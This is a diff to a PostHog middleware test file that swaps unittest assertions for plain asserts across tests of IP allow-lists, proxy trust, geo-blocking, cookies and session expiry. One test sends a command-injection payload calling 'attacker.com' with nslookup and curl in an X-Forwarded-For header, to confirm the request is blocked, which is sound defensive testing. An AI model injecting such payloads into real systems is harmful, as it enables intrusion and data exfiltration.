@@ -53,38 +53,38 @@ class TestAccessMiddleware(APIBaseTest):
         with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25", "128.0.0.1"]):
             # not in list
             response = self.client.get("/", REMOTE_ADDR="10.0.0.1")
-            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            assert response.status_code == status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" in response.content
 
             # /31 block
             response = self.client.get("/", REMOTE_ADDR="192.168.0.1")
-            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert response.status_code != status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" not in response.content
 
             response = self.client.get("/", REMOTE_ADDR="192.168.0.2")
-            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            assert response.status_code == status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" in response.content
 
             # /24 block
             response = self.client.get("/", REMOTE_ADDR="127.0.0.1")
-            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert response.status_code != status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" not in response.content
 
             response = self.client.get("/", REMOTE_ADDR="127.0.0.100")
-            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert response.status_code != status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" not in response.content
 
             response = self.client.get("/", REMOTE_ADDR="127.0.0.200")
-            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            assert response.status_code == status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" in response.content
 
             # precise ip
             response = self.client.get("/", REMOTE_ADDR="128.0.0.1")
-            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert response.status_code != status.HTTP_403_FORBIDDEN
+            assert b"PostHog is not available" not in response.content
 
             response = self.client.get("/", REMOTE_ADDR="128.0.0.2")
-            self.assertIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" in response.content
 
     def test_trusted_proxies(self):
         with self.settings(
@@ -97,7 +97,7 @@ class TestAccessMiddleware(APIBaseTest):
                     REMOTE_ADDR="10.0.0.1",
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                assert b"PostHog is not available" not in response.content
 
     def test_attempt_spoofing(self):
         with self.settings(
@@ -110,8 +110,8 @@ class TestAccessMiddleware(APIBaseTest):
                     REMOTE_ADDR="10.0.0.1",
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"},
                 )
-                self.assertEqual(response.status_code, 403)
-                self.assertIn(b"PostHog is not available", response.content)
+                assert response.status_code == 403
+                assert b"PostHog is not available" in response.content
 
     def test_trust_all_proxies(self):
         with self.settings(
@@ -124,7 +124,7 @@ class TestAccessMiddleware(APIBaseTest):
                     REMOTE_ADDR="10.0.0.1",
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                assert b"PostHog is not available" not in response.content
 
     def test_blocked_geoip_regions(self):
         with self.settings(
@@ -136,12 +136,12 @@ class TestAccessMiddleware(APIBaseTest):
                     "/",
                     REMOTE_ADDR="45.90.4.87",
                 )
-                self.assertIn(b"PostHog is not available", response.content)
+                assert b"PostHog is not available" in response.content
                 response = self.client.get(
                     "/",
                     REMOTE_ADDR="28.160.62.192",
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                assert b"PostHog is not available" not in response.content
 
         with self.settings(
             BLOCKED_GEOIP_REGIONS=["DE"],
@@ -149,7 +149,7 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             with self.settings(TRUST_ALL_PROXIES=True):
                 response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
-                self.assertNotIn(b"PostHog is not available", response.content)
+                assert b"PostHog is not available" not in response.content
 
     def test_ip_with_port_stripped(self):
         """IP addresses with ports should have the port stripped before validation."""
@@ -160,12 +160,12 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             # IPv4 with port
             response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" not in response.content
 
             # IPv6 with port (bracketed format)
             response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
             # ::1 is not in allowed blocks, so should be blocked
-            self.assertIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" in response.content
 
     def test_malformed_ip_blocked(self):
         """Malformed IPs and attack payloads should be blocked (fail closed)."""
@@ -179,15 +179,15 @@ class TestAccessMiddleware(APIBaseTest):
                 "/",
                 headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"},
             )
-            self.assertIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" in response.content
 
             # Invalid IP format
             response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
-            self.assertIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" in response.content
 
             # Valid IP should work
             response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
-            self.assertNotIn(b"PostHog is not available", response.content)
+            assert b"PostHog is not available" not in response.content
 
 
 class TestAutoProjectMiddleware(APIBaseTest):
@@ -232,10 +232,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_dashboards_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_dashboards_api.status_code == 200
 
     def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(
         self,
@@ -248,10 +248,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_dashboards_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_dashboards_api.status_code == 200
 
     def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(
         self,
@@ -270,10 +270,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
-        self.assertEqual(response_dashboards_api.status_code, 404)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.team.id  # NOT third_team
+        assert response_dashboards_api.status_code == 404
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
     def test_project_unchanged_when_accessing_dashboards_list(self):
@@ -285,9 +285,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.team.id  # NOT third_team
 
     def test_project_switched_when_accessing_insight_of_another_accessible_team(self):
         insight = Insight.objects.create(team=self.second_team)
@@ -298,10 +298,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_insights_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_insights_api.status_code == 200
 
     def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(
         self,
@@ -314,10 +314,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_insights_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_insights_api.status_code == 200
 
     def test_project_switched_when_accessing_action_of_another_accessible_team(self):
         action = Action.objects.create(team=self.second_team)
@@ -328,10 +328,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_actions_api = self.client.get(f"/api/projects/@current/actions/{action.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_actions_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_actions_api.status_code == 200
 
     def test_project_switched_when_accessing_cohort_of_another_accessible_team(self):
         cohort = Cohort.objects.create(team=self.second_team, created_by=self.user)
@@ -342,10 +342,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_cohorts_api = self.client.get(f"/api/projects/@current/cohorts/{cohort.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_cohorts_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_cohorts_api.status_code == 200
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
     def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(
@@ -362,10 +362,10 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.user.refresh_from_db()
         response_feature_flags_api = self.client.get(f"/api/projects/@current/feature_flags/{feature_flag.id}/")
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
-        self.assertEqual(response_feature_flags_api.status_code, 200)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.second_team.id
+        assert response_feature_flags_api.status_code == 200
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
     def test_project_unchanged_when_creating_feature_flag(self):
@@ -375,9 +375,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         response_users_api_data = response_users_api.json()
         self.user.refresh_from_db()
 
-        self.assertEqual(response_app.status_code, 200)
-        self.assertEqual(response_users_api.status_code, 200)
-        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)
+        assert response_app.status_code == 200
+        assert response_users_api.status_code == 200
+        assert response_users_api_data.get("team", {}).get("id") == self.team.id
 
     def test_project_switched_when_accessing_another_project_by_id(self):
         project_1_request = self.client.get(f"/project/{self.team.pk}/home")
@@ -458,92 +458,92 @@ class TestPostHogTokenCookieMiddleware(APIBaseTest):
     def test_logged_out_client(self):
         self.client.logout()
         response = self.client.get("/")
-        self.assertEqual(0, len(response.cookies))
+        assert 0 == len(response.cookies)
 
     def test_logged_in_client(self):
         self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
         response = self.client.get("/")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        assert response.status_code == status.HTTP_200_OK
 
         ph_project_token_cookie = response.cookies["ph_current_project_token"]
-        self.assertEqual(ph_project_token_cookie.key, "ph_current_project_token")
-        self.assertEqual(ph_project_token_cookie.value, self.team.api_token)
-        self.assertEqual(ph_project_token_cookie["path"], "/")
-        self.assertEqual(ph_project_token_cookie["samesite"], "Strict")
-        self.assertEqual(ph_project_token_cookie["httponly"], "")
-        self.assertEqual(ph_project_token_cookie["domain"], "posthog.com")
-        self.assertEqual(ph_project_token_cookie["comment"], "")
-        self.assertEqual(ph_project_token_cookie["secure"], True)
-        self.assertEqual(ph_project_token_cookie["max-age"], 31536000)
+        assert ph_project_token_cookie.key == "ph_current_project_token"
+        assert ph_project_token_cookie.value == self.team.api_token
+        assert ph_project_token_cookie["path"] == "/"
+        assert ph_project_token_cookie["samesite"] == "Strict"
+        assert ph_project_token_cookie["httponly"] == ""
+        assert ph_project_token_cookie["domain"] == "posthog.com"
+        assert ph_project_token_cookie["comment"] == ""
+        assert ph_project_token_cookie["secure"]
+        assert ph_project_token_cookie["max-age"] == 31536000
 
         ph_project_name_cookie = response.cookies["ph_current_project_name"]
-        self.assertEqual(ph_project_name_cookie.key, "ph_current_project_name")
-        self.assertEqual(ph_project_name_cookie.value, self.team.name)
-        self.assertEqual(ph_project_name_cookie["path"], "/")
-        self.assertEqual(ph_project_name_cookie["samesite"], "Strict")
-        self.assertEqual(ph_project_name_cookie["httponly"], "")
-        self.assertEqual(ph_project_name_cookie["domain"], "posthog.com")
-        self.assertEqual(ph_project_name_cookie["comment"], "")
-        self.assertEqual(ph_project_name_cookie["secure"], True)
-        self.assertEqual(ph_project_name_cookie["max-age"], 31536000)
+        assert ph_project_name_cookie.key == "ph_current_project_name"
+        assert ph_project_name_cookie.value == self.team.name
+        assert ph_project_name_cookie["path"] == "/"
+        assert ph_project_name_cookie["samesite"] == "Strict"
+        assert ph_project_name_cookie["httponly"] == ""
+        assert ph_project_name_cookie["domain"] == "posthog.com"
+        assert ph_project_name_cookie["comment"] == ""
+        assert ph_project_name_cookie["secure"]
+        assert ph_project_name_cookie["max-age"] == 31536000
 
         ph_instance_cookie = response.cookies["ph_current_instance"]
-        self.assertEqual(ph_instance_cookie.key, "ph_current_instance")
-        self.assertEqual(ph_instance_cookie.value, SITE_URL)
-        self.assertEqual(ph_instance_cookie["path"], "/")
-        self.assertEqual(ph_instance_cookie["samesite"], "Strict")
-        self.assertEqual(ph_instance_cookie["httponly"], "")
-        self.assertEqual(ph_instance_cookie["domain"], "posthog.com")
-        self.assertEqual(ph_instance_cookie["comment"], "")
-        self.assertEqual(ph_instance_cookie["secure"], True)
-        self.assertEqual(ph_instance_cookie["max-age"], 31536000)
+        assert ph_instance_cookie.key == "ph_current_instance"
+        assert ph_instance_cookie.value == SITE_URL
+        assert ph_instance_cookie["path"] == "/"
+        assert ph_instance_cookie["samesite"] == "Strict"
+        assert ph_instance_cookie["httponly"] == ""
+        assert ph_instance_cookie["domain"] == "posthog.com"
+        assert ph_instance_cookie["comment"] == ""
+        assert ph_instance_cookie["secure"]
+        assert ph_instance_cookie["max-age"] == 31536000
 
         ph_last_login_method_cookie = response.cookies["ph_last_login_method"]
-        self.assertEqual(ph_last_login_method_cookie.key, "ph_last_login_method")
-        self.assertEqual(ph_last_login_method_cookie.value, "password")
-        self.assertEqual(ph_last_login_method_cookie["path"], "/")
-        self.assertEqual(ph_last_login_method_cookie["samesite"], "Strict")
-        self.assertEqual(ph_last_login_method_cookie["httponly"], "")
-        self.assertEqual(ph_last_login_method_cookie["domain"], "posthog.com")
-        self.assertEqual(ph_last_login_method_cookie["comment"], "")
-        self.assertEqual(ph_last_login_method_cookie["secure"], True)
-        self.assertEqual(ph_last_login_method_cookie["max-age"], 31536000)
+        assert ph_last_login_method_cookie.key == "ph_last_login_method"
+        assert ph_last_login_method_cookie.value == "password"
+        assert ph_last_login_method_cookie["path"] == "/"
+        assert ph_last_login_method_cookie["samesite"] == "Strict"
+        assert ph_last_login_method_cookie["httponly"] == ""
+        assert ph_last_login_method_cookie["domain"] == "posthog.com"
+        assert ph_last_login_method_cookie["comment"] == ""
+        assert ph_last_login_method_cookie["secure"]
+        assert ph_last_login_method_cookie["max-age"] == 31536000
 
     def test_logout(self):
         self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
         response = self.client.get("/")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        assert response.status_code == status.HTTP_200_OK
 
-        self.assertEqual(response.cookies["ph_current_project_token"].key, "ph_current_project_token")
-        self.assertEqual(response.cookies["ph_current_project_token"].value, self.team.api_token)
-        self.assertEqual(response.cookies["ph_current_project_token"]["max-age"], 31536000)
+        assert response.cookies["ph_current_project_token"].key == "ph_current_project_token"
+        assert response.cookies["ph_current_project_token"].value == self.team.api_token
+        assert response.cookies["ph_current_project_token"]["max-age"] == 31536000
 
-        self.assertEqual(response.cookies["ph_current_project_name"].key, "ph_current_project_name")
-        self.assertEqual(response.cookies["ph_current_project_name"].value, self.team.name)
-        self.assertEqual(response.cookies["ph_current_project_name"]["max-age"], 31536000)
+        assert response.cookies["ph_current_project_name"].key == "ph_current_project_name"
+        assert response.cookies["ph_current_project_name"].value == self.team.name
+        assert response.cookies["ph_current_project_name"]["max-age"] == 31536000
 
-        self.assertEqual(response.cookies["ph_current_instance"].key, "ph_current_instance")
-        self.assertEqual(response.cookies["ph_current_instance"].value, SITE_URL)
-        self.assertEqual(response.cookies["ph_current_instance"]["max-age"], 31536000)
+        assert response.cookies["ph_current_instance"].key == "ph_current_instance"
+        assert response.cookies["ph_current_instance"].value == SITE_URL
+        assert response.cookies["ph_current_instance"]["max-age"] == 31536000
 
-        self.assertEqual(response.cookies["ph_last_login_method"].key, "ph_last_login_method")
-        self.assertEqual(response.cookies["ph_last_login_method"].value, "password")
-        self.assertEqual(response.cookies["ph_last_login_method"]["max-age"], 31536000)
+        assert response.cookies["ph_last_login_method"].key == "ph_last_login_method"
+        assert response.cookies["ph_last_login_method"].value == "password"
+        assert response.cookies["ph_last_login_method"]["max-age"] == 31536000
 
         response = self.client.post("/logout/")
 
         # Check that the local cookies will be removed by having 'expires' in the past
-        self.assertTrue(response.cookies["ph_current_project_token"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
-        self.assertTrue(response.cookies["ph_current_project_name"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
+        assert response.cookies["ph_current_project_token"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT"
+        assert response.cookies["ph_current_project_name"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT"
         # We don't want to remove the ph_current_instance cookie
-        self.assertNotIn("ph_current_instance", response.cookies)
+        assert "ph_current_instance" not in response.cookies
 
         # Request a page after logging out
         response = self.client.get("/")
 
         # Check if the cookies are not present in the response
-        self.assertNotIn("ph_current_project_token", response.cookies)
-        self.assertNotIn("ph_current_project_name", response.cookies)
+        assert "ph_current_project_token" not in response.cookies
+        assert "ph_current_project_name" not in response.cookies
 
 
 @override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@@ -1503,36 +1503,30 @@ class TestSessionAgeMiddleware(APIBaseTest):
     def test_session_continues_when_not_expired(self, mock_time):
         # Initial request sets session creation time
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
-        self.assertEqual(
-            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
-            1704110400.0,
-        )
+        assert response.status_code == 200
+        assert self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY) == 1704110400.0
 
         # Move forward 99 seconds (before timeout)
         mock_time.return_value = 1704110499.0  # 2024-01-01 12:01:39
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
+        assert response.status_code == 200
 
     @freeze_time("2024-01-01 12:00:00")
     @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
     def test_session_expires_after_total_time(self, mock_time):
         # Initial request sets session creation time
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
-        self.assertEqual(
-            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
-            1704110400.0,
-        )
+        assert response.status_code == 200
+        assert self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY) == 1704110400.0
 
         # Move forward past total session age (101 seconds)
         mock_time.return_value = 1704110501.0  # 2024-01-01 12:01:41
         response = self.client.get("/")
         # Should redirect to login
-        self.assertEqual(response.status_code, 302)
-        self.assertEqual(
-            response.headers["Location"],
-            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
+        assert response.status_code == 302
+        assert (
+            response.headers["Location"]
+            == "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
         )
 
     @freeze_time("2024-01-01 12:00:00")
@@ -1543,20 +1537,17 @@ class TestSessionAgeMiddleware(APIBaseTest):
 
         # Initial request sets session creation time
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
-        self.assertEqual(
-            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
-            1704110400.0,
-        )
+        assert response.status_code == 200
+        assert self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY) == 1704110400.0
 
         # Move forward past org timeout (51 seconds)
         mock_time.return_value = 1704110451.0  # 2024-01-01 12:00:51
         response = self.client.get("/")
         # Should redirect to login
-        self.assertEqual(response.status_code, 302)
-        self.assertEqual(
-            response.headers["Location"],
-            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
+        assert response.status_code == 302
+        assert (
+            response.headers["Location"]
+            == "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
         )
 
     @freeze_time("2024-01-01 12:00:00")
@@ -1573,11 +1564,8 @@ class TestSessionAgeMiddleware(APIBaseTest):
 
         # Initial request sets session creation time
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
-        self.assertEqual(
-            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
-            1704110400.0,
-        )
+        assert response.status_code == 200
+        assert self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY) == 1704110400.0
 
         # Switch to other team
         self.user.team = other_team
@@ -1588,15 +1576,15 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Move forward 29 seconds (before new org's timeout)
         mock_time.return_value = 1704110429.0  # 2024-01-01 12:00:29
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 200)
+        assert response.status_code == 200
 
         # Move forward 31 seconds (past new org's timeout)
         mock_time.return_value = 1704110431.0  # 2024-01-01 12:00:31
         response = self.client.get("/")
-        self.assertEqual(response.status_code, 302)
-        self.assertEqual(
-            response.headers["Location"],
-            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
+        assert response.status_code == 302
+        assert (
+            response.headers["Location"]
+            == "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
         )
 
 
@@ -1607,12 +1595,12 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
 
         # API paths are skipped by middleware
         response = self.client.get("/api/users/@me/")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
-        self.assertEqual(response.json()["email"], self.user.email)
+        assert response.status_code == status.HTTP_200_OK
+        assert response.json()["email"] == self.user.email
 
         # Non-API paths are checked
         response = self.client.get("/dashboard")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        assert response.status_code == status.HTTP_200_OK
 
     def test_api_paths_skipped_even_with_inactive_org(self):
         """API paths should be skipped by middleware regardless of org status"""
@@ -1622,7 +1610,7 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
 
         # API paths should work even with inactive org
         response = self.client.get("/api/users/@me/")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        assert response.status_code == status.HTTP_200_OK
 
     def test_inactive_organization_redirects_non_api_paths(self):
         other_org = Organization.objects.create(name="Other Org", is_active=True)
@@ -1634,8 +1622,8 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
 
         # Non-API paths should redirect
         response = self.client.get("/dashboard")
-        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
-        self.assertEqual(response.headers["Location"], "/organization-deactivated")
+        assert response.status_code == status.HTTP_302_FOUND
+        assert response.headers["Location"] == "/organization-deactivated"
 
     def test_inactive_organization_allows_organization_deactivated_page(self):
         self.organization.is_active = False
@@ -1644,7 +1632,7 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
 
         # Should allow access to the deactivated page itself
         response = self.client.get("/organization-deactivated")
-        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        assert response.status_code == status.HTTP_200_OK
 
     def test_logout_path_skipped(self):
         """Logout paths should be skipped by middleware"""
@@ -1653,19 +1641,19 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
 
         response = self.client.post("/logout/")
         # Logout may redirect (302 is normal), but should not redirect to organization-deactivated
-        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
-        self.assertNotIn("organization-deactivated", response.headers.get("Location", ""))
+        assert response.status_code == status.HTTP_302_FOUND
+        assert "organization-deactivated" not in response.headers.get("Location", "")
 
     def test_unauthenticated_user_not_affected(self):
         self.client.logout()
         # API paths are skipped, so auth check happens in view
         response = self.client.get("/api/users/@me/")
-        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
+        assert response.status_code == status.HTTP_401_UNAUTHORIZED
 
         # Non-API paths are also skipped for unauthenticated users
         response = self.client.get("/dashboard")
         # Should redirect to login or show appropriate response
-        self.assertIn(response.status_code, [status.HTTP_302_FOUND, status.HTTP_200_OK])
+        assert response.status_code in [status.HTTP_302_FOUND, status.HTTP_200_OK]
 
     @parameterized.expand(
         [
@@ -1680,9 +1668,9 @@ class TestActiveOrganizationMiddleware(APIBaseTest):
         self.organization.save()
 
         response = self.client.get(path)
-        self.assertEqual(response.status_code, expected_status)
+        assert response.status_code == expected_status
         if expected_location:
-            self.assertEqual(response.headers["Location"], expected_location)
+            assert response.headers["Location"] == expected_location
 
 
 class TestActivityLoggingMiddleware(APIBaseTest):
@@ -1711,15 +1699,15 @@ class TestActivityLoggingMiddleware(APIBaseTest):
         request = self.factory.get("/", HTTP_X_POSTHOG_CLIENT="posthog-js/1.234.0")
         request.user = self.user
         self.middleware(request)
-        self.assertEqual(self.captured["client"], "posthog-js/1.234.0")
+        assert self.captured["client"] == "posthog-js/1.234.0"
         # Storage is cleared after the request finishes
-        self.assertIsNone(self.activity_storage.get_client())
+        assert self.activity_storage.get_client() is None
 
     def test_missing_header_leaves_client_unset(self):
         request = self.factory.get("/")
         request.user = self.user
         self.middleware(request)
-        self.assertIsNone(self.captured["client"])
+        assert self.captured["client"] is None
 
     def test_long_header_value_is_truncated(self):
         from posthog.models.activity_logging.utils import ACTIVITY_LOG_CLIENT_MAX_LENGTH
@@ -1728,15 +1716,15 @@ class TestActivityLoggingMiddleware(APIBaseTest):
         request = self.factory.get("/", HTTP_X_POSTHOG_CLIENT=long_value)
         request.user = self.user
         self.middleware(request)
-        self.assertEqual(self.captured["client"], "x" * ACTIVITY_LOG_CLIENT_MAX_LENGTH)
+        assert self.captured["client"] == "x" * ACTIVITY_LOG_CLIENT_MAX_LENGTH
 
     def test_captures_ip_address_from_remote_addr(self):
         request = self.factory.get("/", REMOTE_ADDR="203.0.113.42")
         request.user = self.user
         self.middleware(request)
-        self.assertEqual(self.captured["ip_address"], "203.0.113.42")
+        assert self.captured["ip_address"] == "203.0.113.42"
         # Storage is cleared after the request finishes
-        self.assertIsNone(self.activity_storage.get_ip_address())
+        assert self.activity_storage.get_ip_address() is None
 
     def test_captures_ip_address_from_x_forwarded_for(self):
         request = self.factory.get(
@@ -1747,13 +1735,13 @@ class TestActivityLoggingMiddleware(APIBaseTest):
         request.user = self.user
         self.middleware(request)
         # leftmost XFF entry wins
-        self.assertEqual(self.captured["ip_address"], "198.51.100.7")
+        assert self.captured["ip_address"] == "198.51.100.7"
 
     def test_invalid_ip_stored_as_none(self):
         request = self.factory.get("/", REMOTE_ADDR="not-an-ip")
         request.user = self.user
         self.middleware(request)
-        self.assertIsNone(self.captured["ip_address"])
+        assert self.captured["ip_address"] is None
 
 
 class TestCSPMiddleware(APIBaseTest):
@@ -1826,10 +1814,10 @@ class TestSocialAuthExceptionMiddleware(APIBaseTest):
         request = self.factory.get(path)
         response = self.middleware.process_exception(request, exception)
 
-        self.assertIsNotNone(response)
+        assert response is not None
         assert isinstance(response, HttpResponseRedirect)
-        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
-        self.assertEqual(response.url, expected_url)
+        assert response.status_code == status.HTTP_302_FOUND
+        assert response.url == expected_url
 
     @parameterized.expand(
         [
@@ -1856,16 +1844,16 @@ class TestSocialAuthExceptionMiddleware(APIBaseTest):
         request = self.factory.get(path)
         response = self.middleware.process_exception(request, exception)
 
-        self.assertIsNotNone(response)
+        assert response is not None
         assert isinstance(response, HttpResponseRedirect)
-        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
-        self.assertIn("error_code=social_login_failure", response.url)
-        self.assertIn("error_detail=", response.url)
